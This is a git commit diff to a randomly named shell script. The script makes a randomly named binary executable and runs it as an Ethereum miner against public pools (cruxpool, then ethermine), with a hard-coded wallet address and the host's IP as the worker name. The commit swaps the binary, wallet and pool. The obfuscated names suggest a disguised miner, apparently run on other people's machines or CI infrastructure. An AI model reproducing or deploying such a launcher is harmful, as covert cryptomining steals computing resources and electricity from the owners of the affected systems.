f541ec366701c0e7a6897cef3be592a1c3dc6d06
ichakiddiw <80237892+ichakiddiw@users.noreply.github.com>
2021-03-09 10:38:06 +0700

    Update jhsfgfdhgd.sh

--- jhsfgfdhgd.sh
+++ jhsfgfdhgd.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x ./dskjfhdfdhg && ./dskjfhdfdhg -P stratum1+tcp://0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e.$ip@asia.cruxpool.com:5555 -G -R
+chmod +x ./sbjkabsjkab && ./sbjkabsjkab -P stratum1+tcp://0xd885ab6fb5d05424b90aff7f5492310a5b981b19.$ip@eu1.ethermine.org:4444 -G -R
